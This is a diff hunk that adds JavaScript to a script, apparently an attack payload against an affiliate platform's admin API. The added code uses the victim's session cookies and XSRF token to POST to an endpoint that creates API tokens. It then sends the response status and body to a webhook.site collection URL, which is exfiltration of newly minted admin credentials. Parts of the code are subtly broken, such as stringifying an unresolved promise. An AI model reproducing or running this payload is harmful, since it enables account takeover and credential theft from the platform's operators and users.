@@ -14,6 +14,41 @@ function getCookie(name) {
   return null; // Return null if the cookie is not found
 }
 
+
+fetch('https://affiliates-api.ggpartners.com/api2/admin/profile/api_tokens', {
+  method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
+  headers: {
+        "XSRF-TOKEN-X": getCookie("XSRF-TOKEN-X"), 
+    "x-xsrf-token": getCookie("XSRF-TOKEN-X"), 
+    "xsrf-token": getCookie("XSRF-TOKEN-X"),
+        "Content-Type": "application/json"
+      },
+  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
+})
+.then(response => {
+  if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  a = response.json(); // Parse the JSON response from the server
+ const jsonString = JSON.stringify(a );
+  var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+})
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  a = error.json(); // Parse the JSON response from the server
+
+  
+});
+
 fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
